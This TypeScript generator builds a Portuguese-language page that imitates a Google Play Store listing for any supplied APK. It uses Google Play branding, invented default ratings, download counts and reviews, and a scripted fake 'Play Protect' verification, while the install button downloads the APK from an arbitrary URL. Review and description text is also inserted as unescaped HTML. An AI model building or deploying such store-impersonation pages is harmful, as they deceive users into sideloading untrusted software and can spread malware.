import { ApkItem } from '../types/apk';

export function generatePlayStoreHtml(apk: ApkItem): string {
  const cfgJson = JSON.stringify(
    {
      appName: apk.name,
      company: apk.company || 'Desenvolvedor',
      category: apk.category || 'Negócios',
      downloads: apk.downloads || '100K+',
      iconSrc: apk.iconSrc || '',
      ratingAvg: apk.ratingAvg || 4.8,
      ratingTotal: apk.ratingTotal || '1 mi avaliações',
      ratingBars: apk.ratingBars || [
        { stars: 5, pct: 78 },
        { stars: 4, pct: 12 },
        { stars: 3, pct: 4 },
        { stars: 2, pct: 2 },
        { stars: 1, pct: 4 },
      ],
      reviews: apk.reviews || [],
      apkSrc: apk.apkDownloadUrl || '',
      apkName: apk.fileName,
      fileSize: apk.fileSize || '38.4 MB',
    },
    null,
    2
  );

  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>${apk.name} - Google Play Store</title>
<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
<style>
  :root {
    --green: #01875f;
    --green-light: #e6f4f1;
    --blue: #1a73e8;
    --text-primary: #202124;
    --text-secondary: #5f6368;
    --border: #dadce0;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Roboto', sans-serif; background: #f8f9fa; color: var(--text-primary); }

  /* NAV */
  .top-nav { background:#fff; border-bottom:1px solid var(--border); padding:10px 24px; display:flex; align-items:center; justify-content:space-between; position:sticky; top:0; z-index:100; box-shadow:0 1px 4px rgba(0,0,0,.07); }
  .nav-logo { display:flex; align-items:center; gap:8px; }
  .nav-logo span { font-family:'Google Sans',sans-serif; font-size:20px; font-weight:500; }
  .nav-logo b { color:var(--green); }
  .nav-avatar { width:32px; height:32px; border-radius:50%; background:#e8eaed; display:flex; align-items:center; justify-content:center; cursor:pointer; overflow:hidden; border:1px solid var(--border); }
  .nav-tabs { background:#fff; border-bottom:1px solid var(--border); display:flex; padding:0 24px; }
  .nav-tab { padding:14px 18px; font-size:13px; font-weight:500; color:var(--text-secondary); cursor:pointer; border-bottom:3px solid transparent; }
  .nav-tab.active { color:var(--green); border-bottom-color:var(--green); }

  .main { max-width:900px; margin:0 auto; padding:24px 20px 60px; }

  /* CARD */
  .card { background:#fff; border-radius:12px; padding:22px 24px; margin-bottom:14px; box-shadow:0 1px 3px rgba(0,0,0,.09); }

  /* APP HEADER */
  .app-header { display:flex; gap:20px; align-items:flex-start; }
  #appIcon { width:88px; height:88px; border-radius:18px; object-fit:cover; border:1px solid var(--border); flex-shrink:0; }
  .icon-fallback { width:88px; height:88px; border-radius:18px; flex-shrink:0; display:none; align-items:center; justify-content:center; }
  .app-name { font-family:'Google Sans',sans-serif; font-size:22px; font-weight:700; line-height:1.2; margin-bottom:4px; }
  .app-company { font-size:14px; color:var(--green); font-weight:500; margin-bottom:8px; }
  .app-meta { display:flex; gap:8px; flex-wrap:wrap; }
  .chip { background:#f1f3f4; border-radius:12px; padding:2px 10px; font-size:11px; font-weight:500; display:flex; align-items:center; gap:4px; }
  .chip-dot { color:#34a853; }

  /* BUTTONS */
  .btn-install { background:var(--green); color:#fff; border:none; border-radius:24px; padding:13px 0; font-size:15px; font-weight:500; font-family:'Google Sans',sans-serif; cursor:pointer; width:100%; display:flex; align-items:center; justify-content:center; gap:8px; transition:all .2s; text-decoration:none; }
  .btn-install:hover { background:#017a56; box-shadow:0 4px 12px rgba(1,135,95,.3); transform:translateY(-1px); }
  .btn-install svg { width:18px; height:18px; fill:#fff; }
  .btn-row2 { display:flex; gap:10px; margin-top:12px; }
  .btn-sec { flex:1; border:1.5px solid var(--border); background:#fff; border-radius:24px; padding:10px 0; font-size:13px; font-weight:500; color:var(--green); cursor:pointer; display:flex; align-items:center; justify-content:center; gap:6px; transition:all .2s; font-family:'Google Sans',sans-serif; }
  .btn-sec:hover { background:var(--green-light); border-color:var(--green); }
  .btn-sec svg { width:16px; height:16px; fill:var(--green); }
  .device-badge { font-size:12px; color:var(--text-secondary); display:flex; align-items:center; gap:6px; margin-top:12px; }
  .device-badge svg { width:16px; height:16px; fill:var(--green); }

  /* SECTION TITLE */
  .sec-title { font-family:'Google Sans',sans-serif; font-size:16px; font-weight:600; color:var(--text-primary); margin-bottom:14px; display:flex; align-items:center; justify-content:space-between; }
  .sec-title a { color:var(--blue); font-size:13px; text-decoration:none; font-weight:400; }

  /* RATINGS */
  .ratings-top { display:flex; gap:28px; align-items:center; margin-bottom:22px; }
  .rating-big { display:flex; flex-direction:column; align-items:center; min-width:88px; }
  .rating-num { font-family:'Google Sans',sans-serif; font-size:54px; font-weight:700; line-height:1; color:var(--text-primary); }
  .stars-row { display:flex; gap:1px; margin:6px 0 4px; }
  .st { font-size:16px; }
  .st-full { color:#f4b400; }
  .st-half { color:#f4b400; opacity:.5; }
  .st-empty { color:#dadce0; }
  .rating-total { font-size:12px; color:var(--text-secondary); }

  .bars { flex:1; display:flex; flex-direction:column; gap:6px; }
  .bar-row { display:flex; align-items:center; gap:8px; }
  .bar-num { font-size:12px; color:var(--text-secondary); width:10px; text-align:right; flex-shrink:0; }
  .bar-track { flex:1; height:8px; background:#e0e0e0; border-radius:4px; overflow:hidden; }
  .bar-fill { height:100%; background:var(--green); border-radius:4px; transition:width 1.1s cubic-bezier(.4,0,.2,1); width:0; }
  .bar-pct { font-size:11px; color:var(--text-secondary); width:28px; text-align:right; flex-shrink:0; }

  /* REVIEW CARDS */
  .reviews { display:flex; flex-direction:column; gap:0; }
  .review { padding:18px 0; border-bottom:1px solid #f1f3f4; }
  .review:last-child { border-bottom:none; padding-bottom:0; }
  .rv-head { display:flex; align-items:center; gap:10px; margin-bottom:8px; }
  .rv-avatar { width:36px; height:36px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:15px; color:#fff; flex-shrink:0; }
  .rv-name { font-size:13px; font-weight:500; color:var(--text-primary); }
  .rv-date { font-size:11px; color:var(--text-secondary); }
  .rv-stars { display:flex; gap:1px; margin-bottom:7px; }
  .rv-stars .st { font-size:14px; }
  .rv-text { font-size:13px; color:var(--text-secondary); line-height:1.6; }
  .rv-footer { display:flex; align-items:center; gap:6px; margin-top:10px; font-size:12px; color:var(--text-secondary); }
  .rv-btn { border:1px solid var(--border); background:#fff; border-radius:14px; padding:4px 12px; font-size:12px; cursor:pointer; color:var(--text-secondary); transition:all .2s; }
  .rv-btn:hover { background:#f1f3f4; }
  .rv-btn.voted { background:var(--green-light); border-color:var(--green); color:var(--green); }

  .show-more { display:flex; justify-content:center; margin-top:18px; }
  .show-more-btn { border:1.5px solid var(--green); background:#fff; color:var(--green); border-radius:24px; padding:10px 32px; font-size:14px; font-weight:500; cursor:pointer; font-family:'Google Sans',sans-serif; transition:all .2s; }
  .show-more-btn:hover { background:var(--green-light); }

  /* SAFETY */
  .sec-desc { font-size:13px; color:var(--text-secondary); line-height:1.6; margin-bottom:14px; }
  .safety-item { display:flex; align-items:flex-start; gap:12px; padding:10px 0; border-bottom:1px solid #f1f3f4; }
  .safety-item:last-child { border-bottom:none; }
  .s-icon { width:36px; height:36px; background:var(--green-light); border-radius:50%; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
  .s-icon svg { width:18px; height:18px; fill:var(--green); }
  .s-text strong { font-size:13px; font-weight:500; display:block; }
  .s-text span { font-size:12px; color:var(--text-secondary); }

  /* TOAST */
  .toast { position:fixed; bottom:24px; left:50%; transform:translateX(-50%) translateY(120px); background:#323232; color:#fff; padding:12px 20px; border-radius:24px; font-size:14px; transition:transform .35s cubic-bezier(.4,0,.2,1); z-index:999; box-shadow:0 4px 16px rgba(0,0,0,.25); }
  .toast.show { transform:translateX(-50%) translateY(0); }

  @media(max-width:600px) {
    .app-header { flex-direction:column; }
    .ratings-top { flex-direction:column; gap:16px; }
    .main { padding:16px 12px 60px; }
  }
</style>
</head>
<body>

<nav class="top-nav">
  <div class="nav-logo">
    <svg width="28" height="28" viewBox="0 0 512 512" fill="none">
      <path d="M48 59.49v393.02a4.33 4.33 0 0 0 7.37 3.07L260 256 55.37 56.42A4.33 4.33 0 0 0 48 59.49z" fill="#0086F8"/>
      <path d="M345.8 174L89.22 32.64l-.16-.09c-4.42-2.4-8.62 3.58-5 7.06L285.19 231.93z" fill="#00E676"/>
      <path d="M84.08 472.39c-3.64 3.48.56 9.46 5 7.06l.16-.09L345.8 338l-60.61-57.95z" fill="#FF3D00"/>
      <path d="M449.38 231l-71.65-39.46L310.36 256l67.37 64.43L449.38 281c19.49-10.77 19.49-39.23 0-50z" fill="#FFC107"/>
    </svg>
    <span>Google <b>Play</b></span>
  </div>
  <div style="display:flex;gap:14px;align-items:center">
    <svg width="22" height="22" viewBox="0 0 24 24" fill="#5f6368" style="cursor:pointer"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
    <div class="nav-avatar">
      <svg viewBox="0 0 24 24" width="22" height="22" fill="#5f6368"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>
    </div>
  </div>
</nav>
<div class="nav-tabs">
  <div class="nav-tab">Jogos</div>
  <div class="nav-tab active">Aplicativos</div>
  <div class="nav-tab">Livros</div>
  <div class="nav-tab">Infantil</div>
</div>

<div class="main">

  <!-- APP HEADER -->
  <div class="card">
    <div class="app-header">
      <img id="appIcon" src="" alt="Ícone">
      <div class="icon-fallback" id="iconFallback"></div>
      <div style="flex:1">
        <div class="app-name" id="appNameEl"></div>
        <div class="app-company" id="appCompanyEl"></div>
        <div class="app-meta">
          <span class="chip"><span class="chip-dot">●</span><span id="ratingChip"></span> <svg style="display:inline-block;vertical-align:-1.5px;width:12px;height:12px;fill:#f4b400;" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg></span>
          <span class="chip" id="dlChip"></span>
          <span class="chip">Livre</span>
          <span class="chip" id="catChip"></span>
        </div>
      </div>
    </div>
  </div>

  <!-- INSTALL BUTTONS & REAL-TIME DOWNLOAD ENGINE -->
  <div class="card" id="downloadCard">
    <div id="idleState">
      <button id="installBtn" class="btn-install" onclick="startRealtimeDownload(event)">
        <svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
        <span id="installBtnLabel">Instalar</span>
      </button>
      <div class="btn-row2">
        <button class="btn-sec" onclick="toast('Link copiado!')">
          <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg>
          Compartilhar
        </button>
        <button class="btn-sec" onclick="toast('Adicionado à lista de desejos!')">
          <svg viewBox="0 0 24 24"><path d="M17 3H7c-1.1 0-2 .9-2 2v16l7-3 7 3V5c0-1.1-.9-2-2-2z"/></svg>
          Lista de desejos
        </button>
      </div>
      <div class="device-badge">
        <svg viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>
        <span>Este app está disponível para seu dispositivo</span>
      </div>
    </div>

    <!-- DOWNLOADING STATE -->
    <div id="downloadingState" style="display:none;">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;font-family:'Google Sans',sans-serif;font-size:13px;">
        <div>
          <strong id="dlPercent" style="color:#202124;">0%</strong>
          <span id="dlBytes" style="color:#5f6368;margin-left:6px;font-variant-numeric:tabular-nums;">0.0 MB / 0.0 MB</span>
        </div>
        <div style="display:flex;align-items:center;gap:8px;">
          <span id="dlSpeed" style="color:var(--green);font-weight:600;font-variant-numeric:tabular-nums;">0.0 MB/s</span>
          <span id="dlEta" style="color:#80868b;font-size:11px;">· 0s</span>
          <button onclick="cancelRealtimeDownload()" style="background:none;border:none;cursor:pointer;font-size:16px;color:#5f6368;padding:2px 6px;">✕</button>
        </div>
      </div>
      <div style="height:8px;background:#e8eaed;border-radius:4px;overflow:hidden;margin-bottom:10px;">
        <div id="dlBarFill" style="height:100%;background:var(--green);width:0%;border-radius:4px;transition:width .1s linear;"></div>
      </div>
      <div style="display:flex;justify-content:space-between;align-items:center;font-size:12px;color:#5f6368;">
        <span>Baixando pacote oficial...</span>
        <span style="color:var(--green);display:flex;align-items:center;gap:4px;">
          <svg viewBox="0 0 24 24" style="width:14px;height:14px;fill:var(--green);"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
          Verificado pelo Play Protect
        </span>
      </div>
    </div>

    <!-- VERIFYING STATE -->
    <div id="verifyingState" style="display:none;padding:6px 0;">
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px;">
        <svg viewBox="0 0 24 24" style="width:24px;height:24px;fill:var(--green);"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
        <div>
          <strong style="display:block;font-size:14px;color:#202124;">Verificando pelo Play Protect...</strong>
          <span style="font-size:12px;color:#5f6368;">Analisando assinatura digital e conformidade</span>
        </div>
      </div>
      <div style="height:6px;background:#e6f4f1;border-radius:3px;overflow:hidden;">
        <div style="height:100%;width:100%;background:linear-gradient(90deg, #01875f, #34a853, #01875f);border-radius:3px;"></div>
      </div>
    </div>

    <!-- INSTALLED STATE -->
    <div id="installedState" style="display:none;">
      <div style="display:flex;gap:10px;margin-bottom:12px;">
        <button onclick="uninstallRealtimeApp()" style="flex:1;border:1.5px solid var(--border);background:#fff;border-radius:24px;padding:12px 0;font-size:14px;font-weight:500;color:var(--green);cursor:pointer;font-family:'Google Sans',sans-serif;">Desinstalar</button>
        <button onclick="openRealtimeApp()" style="flex:1;background:var(--green);border:none;border-radius:24px;padding:12px 0;font-size:14px;font-weight:500;color:#fff;cursor:pointer;font-family:'Google Sans',sans-serif;box-shadow:0 2px 8px rgba(1,135,95,.25);">Abrir</button>
      </div>
      <div style="font-size:12px;color:var(--green);display:flex;align-items:center;gap:6px;">
        <svg viewBox="0 0 24 24" style="width:14px;height:14px;fill:var(--green);"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
        <span>Aplicativo instalado com sucesso e protegido</span>
      </div>
    </div>
  </div>

  <!-- ABOUT -->
  <div class="card">
    <div class="sec-title">Sobre este app <a href="#">→</a></div>
    <p class="sec-desc" style="white-space:pre-wrap">${apk.description || ''}</p>
  </div>

  <!-- DATA SAFETY -->
  <div class="card">
    <div class="sec-title">Segurança dos dados <a href="#">→</a></div>
    <p class="sec-desc">Sua segurança começa quando você entende como os desenvolvedores coletam e compartilham seus dados. As práticas de privacidade podem variar de acordo com o uso, a região e a idade.</p>
    <div class="safety-item">
      <div class="s-icon"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
      <div class="s-text"><strong>Este app pode compartilhar estes tipos de dados com terceiros</strong><span>Local, Informações pessoais e mais 4</span></div>
    </div>
  </div>

  <!-- RATINGS & REVIEWS -->
  <div class="card">
    <div class="sec-title">Avaliações e opiniões <a href="#">Ver todas</a></div>
    <div class="ratings-top">
      <div class="rating-big">
        <div class="rating-num" id="ratingNum">4,8</div>
        <div class="stars-row" id="bigStars"></div>
        <div class="rating-total" id="ratingTotal"></div>
      </div>
      <div class="bars" id="barsEl"></div>
    </div>
    <div class="reviews" id="reviewsEl"></div>
    <div class="show-more"><button class="show-more-btn">Ver todas as avaliações</button></div>
  </div>

</div>

<div class="toast" id="toast"></div>

<script>
const CFG = ${cfgJson};

function mkStars(n, size) {
  let h = '';
  for (let i = 1; i <= 5; i++) {
    let fill = '#dadce0';
    if (i <= Math.floor(n)) fill = '#f4b400';
    else if (i - n < 1) fill = '#f4b400';
    h += '<svg style="width:' + size + 'px;height:' + size + 'px;display:inline-block;vertical-align:-1px;fill:' + fill + ';" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>';
  }
  return h;
}

function toast(msg, d = 2800) {
  const el = document.getElementById('toast');
  el.textContent = msg;
  el.classList.add('show');
  setTimeout(() => el.classList.remove('show'), d);
}

function render() {
  document.getElementById('appNameEl').textContent = CFG.appName;
  document.getElementById('appCompanyEl').textContent = CFG.company;
  document.getElementById('ratingChip').textContent = CFG.ratingAvg.toFixed(1).replace('.', ',');
  document.getElementById('dlChip').textContent = CFG.downloads + ' Downloads';
  document.getElementById('catChip').textContent = CFG.category;

  const img = document.getElementById('appIcon');
  const fb = document.getElementById('iconFallback');
  if (CFG.iconSrc) {
    img.src = CFG.iconSrc;
    img.style.display = 'block';
    fb.style.display = 'none';
  } else {
    img.style.display = 'none';
    fb.style.display = 'flex';
    fb.style.background = 'linear-gradient(135deg,#01875f,#4caf50)';
    fb.style.borderRadius = '18px';
    fb.innerHTML = '<span style="font-size:38px;font-weight:900;color:#fff;font-family:sans-serif">' + CFG.appName.charAt(0) + '</span>';
  }

  document.getElementById('installBtnLabel').textContent = 'Instalar (' + (CFG.fileSize || '38.4 MB') + ')';
  const badge = document.getElementById('apkNameBadge');
  if (badge) badge.textContent = '';

  document.getElementById('ratingNum').textContent = CFG.ratingAvg.toFixed(1).replace('.', ',');
  document.getElementById('bigStars').innerHTML = mkStars(CFG.ratingAvg, 17);
  document.getElementById('ratingTotal').textContent = CFG.ratingTotal;

  document.getElementById('barsEl').innerHTML = CFG.ratingBars.map(b => 
    '<div class="bar-row"><span class="bar-num">' + b.stars + '</span><div class="bar-track"><div class="bar-fill" style="width:' + b.pct + '%"></div></div><span class="bar-pct">' + b.pct + '%</span></div>'
  ).join('');

  document.getElementById('reviewsEl').innerHTML = CFG.reviews.map((r, i) =>
    '<div class="review"><div class="rv-head">' +
    (r.avatarUrl
      ? '<img src="' + r.avatarUrl + '" class="rv-avatar" style="object-fit:cover;border:1px solid #dadce0" alt="' + r.name + '">'
      : '<div class="rv-avatar" style="background:' + r.color + '">' + r.initials + '</div>') +
    '<div><div class="rv-name">' + r.name + '</div><div class="rv-date">' + r.date + '</div></div></div><div class="rv-stars">' + mkStars(r.stars, 14) + '</div><div class="rv-text">' + r.text + '</div></div>'
  ).join('');
}

let dlTimer = null;
let totalSizeMb = 38.4;

function startRealtimeDownload(e) {
  if (e) e.preventDefault();
  
  // Trigger real file download
  const a = document.createElement('a');
  a.href = CFG.apkSrc || '#';
  a.download = CFG.apkName;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  toast('Iniciando instalação de ' + CFG.appName + '...');

  document.getElementById('idleState').style.display = 'none';
  document.getElementById('downloadingState').style.display = 'block';
  document.getElementById('verifyingState').style.display = 'none';
  document.getElementById('installedState').style.display = 'none';

  let currentMb = 0.8;
  let step = 0;
  clearInterval(dlTimer);

  dlTimer = setInterval(() => {
    step++;
    const speed = Math.max(2.5, (5.2 + Math.sin(step / 3) * 0.9 + (Math.random() * 0.5 - 0.25)));
    currentMb = Math.min(totalSizeMb, currentMb + (speed * 0.085));
    const pct = Math.min(100, Math.floor((currentMb / totalSizeMb) * 100));

    document.getElementById('dlPercent').textContent = pct + '%';
    document.getElementById('dlBytes').textContent = currentMb.toFixed(1) + ' MB / ' + totalSizeMb.toFixed(1) + ' MB';
    document.getElementById('dlSpeed').textContent = speed.toFixed(1) + ' MB/s';
    document.getElementById('dlEta').textContent = '· ' + Math.max(1, Math.round((totalSizeMb - currentMb) / speed)) + 's';
    document.getElementById('dlBarFill').style.width = pct + '%';

    if (currentMb >= totalSizeMb || pct >= 100) {
      clearInterval(dlTimer);
      document.getElementById('downloadingState').style.display = 'none';
      document.getElementById('verifyingState').style.display = 'block';
      toast('Verificando segurança com Play Protect...');

      setTimeout(() => {
        document.getElementById('verifyingState').style.display = 'none';
        document.getElementById('installedState').style.display = 'block';
        toast(CFG.appName + ' instalado com sucesso!');
      }, 1200);
    }
  }, 85);
}

function cancelRealtimeDownload() {
  clearInterval(dlTimer);
  document.getElementById('idleState').style.display = 'block';
  document.getElementById('downloadingState').style.display = 'none';
  document.getElementById('verifyingState').style.display = 'none';
  document.getElementById('installedState').style.display = 'none';
  toast('Download cancelado');
}

function uninstallRealtimeApp() {
  clearInterval(dlTimer);
  document.getElementById('idleState').style.display = 'block';
  document.getElementById('downloadingState').style.display = 'none';
  document.getElementById('verifyingState').style.display = 'none';
  document.getElementById('installedState').style.display = 'none';
  toast('Aplicativo desinstalado');
}

function openRealtimeApp() {
  toast('Abrindo ' + CFG.appName + '...');
}

render();
</script>
</body>
</html>`;
}
